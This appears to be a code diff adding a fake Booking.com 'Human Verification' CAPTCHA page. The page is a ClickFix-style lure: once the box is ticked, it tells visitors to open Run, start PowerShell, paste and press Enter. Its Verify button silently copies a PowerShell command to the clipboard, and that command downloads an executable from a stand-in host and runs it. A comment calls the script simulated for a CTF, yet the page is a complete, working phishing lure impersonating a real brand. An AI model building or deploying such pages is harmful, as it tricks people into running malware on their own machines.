@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Booking.com - Human Verification</title>
+    <style>
+        body {
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            background-color: #f7f8fa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            color: #003580;
+        }
+        .captcha-container {
+            background-color: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            text-align: center;
+            width: 400px;
+            border: 1px solid #e6e6e6;
+        }
+        .captcha-header {
+            font-size: 22px;
+            font-weight: bold;
+            margin-bottom: 15px;
+            color: #003580;
+        }
+        .captcha-instruction {
+            font-size: 16px;
+            margin-bottom: 25px;
+            color: #4a4a4a;
+            line-height: 1.5;
+        }
+        .logo {
+            width: 150px;
+            margin-bottom: 20px;
+        }
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 25px;
+        }
+        .checkbox-label {
+            margin-left: 10px;
+            font-size: 16px;
+            color: #4a4a4a;
+            font-weight: 500;
+        }
+        .verify-steps {
+            background-color: #f8f9fb;
+            padding: 15px;
+            border-radius: 6px;
+            text-align: left;
+            margin-bottom: 20px;
+            font-size: 14px;
+            color: #333;
+            border: 1px solid #e6e6e6;
+        }
+        .verify-steps ol {
+            margin: 0;
+            padding-left: 20px;
+            line-height: 1.6;
+        }
+        .verify-button {
+            background-color: #003580;
+            color: white;
+            padding: 12px 24px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+            transition: background-color 0.2s;
+        }
+        .verify-button:hover {
+            background-color: #00255d;
+        }
+        .verify-button:disabled {
+            background-color: #b3c5e6;
+            cursor: not-allowed;
+        }
+        .hidden {
+            display: none;
+        }
+        .success-message {
+            color: #007e3b;
+            font-size: 18px;
+            font-weight: bold;
+            margin-top: 20px;
+        }
+        .footer-text {
+            font-size: 12px;
+            color: #666;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="captcha-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/be/Booking.com_logo.svg/120px-Booking.com_logo.svg.png?20170103022236" alt="Booking.com Logo" class="logo">
+        <div class="captcha-header">Human Verification</div>
+        <div class="captcha-instruction">Please confirm you're not a robot by checking the box below.</div>
+        <div class="checkbox-container">
+            <input type="checkbox" id="human-check" onchange="toggleButton()">
+            <label for="human-check" class="checkbox-label">I'm not a robot</label>
+        </div>
+        <div id="verify-steps" class="verify-steps hidden">
+            <strong>Verification Steps</strong><br>
+            <ol>
+                <li>Press Windows Button + R</li>
+                <li>Write PowerShell + Press OK</li>
+                <li>Press Ctrl + V</li>
+                <li>Press Enter</li>
+            </ol>
+        </div>
+        <button id="verify-button" class="verify-button" disabled onclick="copyToClipboard()">Verify</button>
+        <div id="success-message" class="success-message hidden">Verification Successful! Redirecting...</div>
+        <div class="footer-text">Protected by Booking.com Security</div>
+    </div>
+
+    <script>
+        function toggleButton() {
+            const checkbox = document.getElementById('human-check');
+            const button = document.getElementById('verify-button');
+            const steps = document.getElementById('verify-steps');
+            button.disabled = !checkbox.checked;
+            steps.classList.toggle('hidden', !checkbox.checked);
+        }
+
+        function copyToClipboard() {
+            const code = "# Simulated malicious PowerShell script for CTF\n" +
+                        "$url = 'https://example.com/malicious.exe';\n" +
+                        "$output = '$env:temp\\malicious.exe';\n" +
+                        "Invoke-WebRequest -Uri $url -OutFile $output;\n" +
+                        "Start-Process $output;";
+            navigator.clipboard.writeText(code).then(() => {
+                const button = document.getElementById('verify-button');
+                const successMessage = document.getElementById('success-message');
+                button.classList.add('hidden');
+                successMessage.classList.remove('hidden');
+                // Redirect to Booking.com after a short delay
+                setTimeout(() => {
+                    window.location.href = 'https://www.booking.com';
+                }, 2000);
+            }).catch(err => {
+                console.error('Failed to copy: ', err);
+            });
+        }
+    </script>
+</body>
+</html>
